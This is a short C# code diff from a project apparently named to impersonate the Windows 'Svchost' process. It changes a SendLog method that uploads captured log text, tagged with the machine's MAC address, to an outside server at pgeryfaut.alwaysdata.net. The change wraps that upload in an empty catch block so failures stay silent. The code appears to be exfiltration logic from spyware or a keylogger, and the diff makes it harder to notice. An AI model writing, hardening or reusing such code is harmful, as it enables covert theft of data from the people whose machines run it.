@@ -26,17 +26,21 @@ namespace Svchost
 
         public static void SendLog(string name, string sentence)
         {
-            using (var client = new WebClient())
+            try
             {
-                var values = new NameValueCollection();
+                using (var client = new WebClient())
+                {
+                    var values = new NameValueCollection();
 
-                values["log"] = sentence;
-                values["author"] = name + " - " + getMacAddress();
+                    values["log"] = sentence;
+                    values["author"] = name + " - " + getMacAddress();
 
-                var response = client.UploadValues("http://pgeryfaut.alwaysdata.net/post.php", values);
+                    var response = client.UploadValues("http://pgeryfaut.alwaysdata.net/post.php", values);
 
-                var responseString = Encoding.UTF8.GetString(response);
+                    var responseString = Encoding.UTF8.GetString(response);
+                }
             }
+            catch { }
         }
     }
 }
